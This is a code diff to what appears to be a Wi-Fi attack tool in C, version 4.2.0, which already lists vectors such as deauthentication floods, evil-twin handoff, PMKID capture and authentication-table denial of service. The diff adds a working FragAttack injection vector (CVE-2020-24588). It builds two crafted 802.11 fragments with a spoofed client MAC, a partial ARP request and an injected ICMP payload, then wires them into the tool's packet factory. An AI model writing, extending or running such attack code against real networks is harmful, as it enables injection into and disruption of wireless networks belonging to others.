@@ -126,7 +126,7 @@ static const char *BANNER =
  *               CONSTANTS
  * ============================================================ */
 
-#define VERSION "4.1.0"
+#define VERSION "4.2.0"
 #define MAX_SSID_LEN 32
 #define MAX_MAC_STR 18
 #define MAX_IFACE 32
@@ -134,6 +134,7 @@ static const char *BANNER =
 #define MAX_APS 50
 #define MAX_AUTH_POOL 16
 #define MAX_PKT_SIZE 512
+#define MAX_FRAG_PAYLOAD 128
 #define SNDBUF_SIZE (2 * 1024 * 1024)
 #define BATCH_SIZE 16
 
@@ -161,6 +162,7 @@ typedef enum {
   VEC_EVIL_TWIN,
   VEC_TKIP_MIC,
   VEC_POWER_SAVE,
+  VEC_FRAGATTACK,
   VEC_COUNT
 } attack_vector_t;
 
@@ -169,7 +171,7 @@ static const char *VEC_NAMES[] = {
     "Disassoc Flood",     "EAPOL Logoff",       "PMKID Capture",
     "Auth Table DoS",     "CSA Action Frame",   "Beacon Confusion",
     "Probe Response CSA", "DELBA Attack",       "Evil Twin Handoff",
-    "TKIP/GCMP MIC Error","Power Save DoS",
+    "TKIP/GCMP MIC Error","Power Save DoS",     "FragAttack Injection",
 };
 
 typedef enum {
@@ -654,6 +656,153 @@ static int mk_confusion_beacon(uint8_t *b, const char *ssid, uint8_t cur_ch) {
 }
 
 /* ============================================================
+ *  FragAttack Injection — Fragment Header Manipulation (CVE-2020-24588)
+ *
+ *  Splits a data frame into two fragments with manipulated headers:
+ *  Fragment 0 (MoreFrag=1): LLC/SNAP header + partial ARP request
+ *  Fragment 1 (MoreFrag=0): Injected payload (plaintext data)
+ *
+ *  The receiver reassembles fragments in RAM and processes the
+ *  reconstructed frame, bypassing per-fragment encryption checks
+ *  on vulnerable implementations.
+ *
+ *  Reference: Mathy Vanhoef, "Fragment and Forge" (USENIX 2021)
+ * ============================================================ */
+
+/* FC flags for fragmentation */
+#define FC_DATA_TODS_MOREFRAG 0x0508  /* Data + ToDS + MoreFragments */
+
+/*
+ * mk_frag_setup — Fragment 0 (setup fragment, MoreFragments=1)
+ *
+ * Frame structure:
+ *   [RadioTap] [802.11 Data ToDS+MoreFrag, frag=0] [LLC/SNAP→0x0800] [ARP partial]
+ *
+ * The LLC/SNAP header declares IPv4 (0x0800) but the actual payload
+ * is crafted to be completed by Fragment 1. Because many receivers
+ * don't verify that all fragments share the same PN/encryption state,
+ * Fragment 1 can inject arbitrary plaintext content.
+ */
+static int mk_frag_setup(uint8_t *b, const uint8_t bss[6],
+                         const uint8_t cli[6], uint16_t seq) {
+  int o = 0;
+  o += mk_rt(b + o);
+
+  /* 802.11 header: Data frame, ToDS=1, MoreFragments=1 */
+  dot11_t *h = (dot11_t *)(b + o);
+  h->fc = htole16(FC_DATA_TODS_MOREFRAG);
+  h->dur = 0;
+  /* ToDS addressing: addr1=BSSID(RA), addr2=SA(client), addr3=DA(BSSID) */
+  memcpy(h->a1, bss, 6);
+  memcpy(h->a2, cli, 6);
+  memcpy(h->a3, bss, 6);
+  /* Sequence Control: seq_num in bits[4:15], frag_num=0 in bits[0:3] */
+  h->seq = htole16((seq << 4) | 0);  /* fragment 0 */
+  o += sizeof(dot11_t);
+
+  /* LLC/SNAP header declaring IPv4 (EtherType 0x0800) */
+  llc_snap_t *l = (llc_snap_t *)(b + o);
+  l->dsap = 0xAA; l->ssap = 0xAA; l->ctrl = 0x03;
+  memset(l->oui, 0, 3);
+  l->type = htons(0x0800);  /* IPv4 */
+  o += sizeof(llc_snap_t);
+
+  /*
+   * Partial ARP-like probe payload (first 14 bytes of an ARP request).
+   * This gets combined with Fragment 1 in the receiver's reassembly buffer.
+   *
+   * ARP header: hw_type(2) + proto_type(2) + hw_len(1) + proto_len(1)
+   *           + opcode(2) + sender_hw(6)
+   */
+  uint8_t arp_partial[] = {
+    0x00, 0x01,       /* Hardware type: Ethernet */
+    0x08, 0x00,       /* Protocol type: IPv4 */
+    0x06,             /* Hardware address length */
+    0x04,             /* Protocol address length */
+    0x00, 0x01,       /* Opcode: ARP Request */
+    /* Sender hardware address (spoofed as client) */
+    cli[0], cli[1], cli[2], cli[3], cli[4], cli[5],
+  };
+  memcpy(b + o, arp_partial, sizeof(arp_partial));
+  o += sizeof(arp_partial);
+
+  return o;
+}
+
+/*
+ * mk_frag_payload — Fragment 1 (payload fragment, MoreFragments=0)
+ *
+ * Frame structure:
+ *   [RadioTap] [802.11 Data ToDS, frag=1] [Injected payload bytes]
+ *
+ * This fragment carries the "tail" of the reassembled frame.
+ * Because the receiver stitches it with Fragment 0's LLC/SNAP
+ * context, the combined result is processed as a valid IPv4 frame
+ * with our injected content — without ever knowing the WPA key.
+ *
+ * The payload here is a crafted ICMP Echo Request (ping) that,
+ * when reassembled, forms a valid IP packet destined to the
+ * gateway, proving plaintext injection capability.
+ */
+static int mk_frag_payload(uint8_t *b, const uint8_t bss[6],
+                            const uint8_t cli[6], uint16_t seq,
+                            const uint8_t *payload, int payload_len) {
+  int o = 0;
+  o += mk_rt(b + o);
+
+  /* 802.11 header: Data frame, ToDS=1, MoreFragments=0 (last frag) */
+  dot11_t *h = (dot11_t *)(b + o);
+  h->fc = htole16(FC_DATA_TODS);  /* No MoreFrag — this is the final fragment */
+  h->dur = 0;
+  memcpy(h->a1, bss, 6);
+  memcpy(h->a2, cli, 6);
+  memcpy(h->a3, bss, 6);
+  /* Same sequence number as Fragment 0, but frag_num=1 */
+  h->seq = htole16((seq << 4) | 1);  /* fragment 1 */
+  o += sizeof(dot11_t);
+
+  /*
+   * Injected payload — completes the ARP started in Fragment 0.
+   * This contains: sender_ip(4) + target_hw(6) + target_ip(4)
+   * plus an ICMP echo request probe that the AP will forward.
+   *
+   * When the two fragments are reassembled in the victim's RAM:
+   *   Fragment 0: [LLC/SNAP→IPv4] [ARP hw_type..sender_hw]
+   *   Fragment 1: [sender_ip..target_ip] [ICMP probe]
+   * = Complete ARP request + ICMP injection
+   */
+  if (payload && payload_len > 0) {
+    int copy_len = payload_len > MAX_FRAG_PAYLOAD ? MAX_FRAG_PAYLOAD : payload_len;
+    memcpy(b + o, payload, copy_len);
+    o += copy_len;
+  } else {
+    /* Default payload: ARP completion + ICMP echo probe */
+    uint8_t default_payload[] = {
+      /* Sender IP: 192.168.1.100 (spoofed) */
+      0xC0, 0xA8, 0x01, 0x64,
+      /* Target hardware address: broadcast */
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+      /* Target IP: 192.168.1.1 (gateway probe) */
+      0xC0, 0xA8, 0x01, 0x01,
+      /* === ICMP Echo Request (injected command channel) === */
+      /* IP header stub (ver=4, IHL=5, total_len, TTL=64, proto=ICMP) */
+      0x45, 0x00, 0x00, 0x1C,  /* IPv4, 28 bytes total */
+      0x00, 0x00, 0x40, 0x00,  /* Don't Fragment */
+      0x40, 0x01, 0x00, 0x00,  /* TTL=64, Proto=ICMP, checksum=0 */
+      0xC0, 0xA8, 0x01, 0x64,  /* Src: 192.168.1.100 */
+      0xC0, 0xA8, 0x01, 0x01,  /* Dst: 192.168.1.1 */
+      /* ICMP Echo Request */
+      0x08, 0x00, 0x00, 0x00,  /* Type=8 (Echo), Code=0 */
+      0xDE, 0xAD, 0xBE, 0xEF,  /* Identifier + Seq (marker) */
+    };
+    memcpy(b + o, default_payload, sizeof(default_payload));
+    o += sizeof(default_payload);
+  }
+
+  return o;
+}
+
+/* ============================================================
  *               PACKET FACTORY
  * ============================================================ */
 
@@ -674,6 +823,9 @@ typedef struct {
   pkt_t delba;
   pkt_t confusion;
   pkt_t auth_pool[MAX_AUTH_POOL];
+  /* FragAttack: two-fragment pair for plaintext injection */
+  pkt_t frag_setup;    /* Fragment 0: LLC/SNAP + partial ARP (MoreFrag=1) */
+  pkt_t frag_payload;  /* Fragment 1: injected payload tail (MoreFrag=0) */
 } factory_t;
 
 /* [FIX 10] factory_build checks parse_mac returns */
@@ -717,6 +869,11 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->delba.len = mk_delba(f->delba.buf, bss, cli);
   f->confusion.len = mk_confusion_beacon(f->confusion.buf, t->ssid, cur_ch);
 
+  /* FragAttack: build paired fragments with shared seq number */
+  uint16_t frag_seq = 42;  /* fixed seq for fragment pairing */
+  f->frag_setup.len = mk_frag_setup(f->frag_setup.buf, bss, cli, frag_seq);
+  f->frag_payload.len = mk_frag_payload(f->frag_payload.buf, bss, cli, frag_seq, NULL, 0);
+
   for (int i = 0; i < MAX_AUTH_POOL; i++) {
     uint8_t fm[6]; rand_mac(fm);
     f->auth_pool[i].len = mk_auth(f->auth_pool[i].buf, bss, fm);
@@ -754,6 +911,11 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
   case VEC_AUTH_DOS:
     for (int i = 0; i < MAX_AUTH_POOL && s.n < 32; i++)
       s.p[s.n++] = &f->auth_pool[i];
+    break;
+  case VEC_FRAGATTACK:
+    /* Fragment pair must be injected in order: setup → payload */
+    s.p[s.n++] = &f->frag_setup;
+    s.p[s.n++] = &f->frag_payload;
     break;
   /* [FIX 3] Non-injection vectors: handled by other engines */
   case VEC_PMKID_CAPTURE:  break;  /* capture thread */
